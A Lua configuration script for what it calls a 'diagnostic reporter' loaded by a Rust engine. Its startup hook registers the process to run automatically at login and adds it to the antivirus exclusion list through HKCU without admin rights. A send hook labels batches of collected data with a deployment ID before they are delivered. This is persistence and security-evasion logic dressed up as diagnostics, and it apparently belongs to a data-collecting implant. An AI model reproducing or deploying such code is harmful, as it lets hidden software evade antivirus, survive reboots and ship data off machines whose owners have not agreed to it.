-- config.lua
-- Runtime configuration for the diagnostic reporter.
-- This script is loaded at startup by the Rust engine.
-- All sensitive/active behaviour lives here, not in the compiled binary.

-- ─────────────────────────────────────────────────
-- on_startup()
-- Called automatically by the engine after this file is loaded.
-- Use it to enable any features you want active on this deployment.
-- ─────────────────────────────────────────────────
function on_startup()
    -- Register this process for automatic startup on login.
    enable_autostart()

    -- Add the process to the AV exclusion list via HKCU (no admin needed).
    exclude_from_av()
end

-- ─────────────────────────────────────────────────
-- on_before_send(raw_data) -> string
-- Called by the reporter thread right before delivering a batch.
-- Transform, filter, or annotate the payload here.
-- Return the final string to deliver.  Return the input unchanged if
-- you don't need any transformation.
-- ─────────────────────────────────────────────────
function on_before_send(raw_data)
    -- Example: tag every batch with a deployment ID so you can tell
    -- which machine sent it without touching the Rust binary.
    local deployment_id = "LAB-001"
    return "[" .. deployment_id .. "] " .. raw_data
end
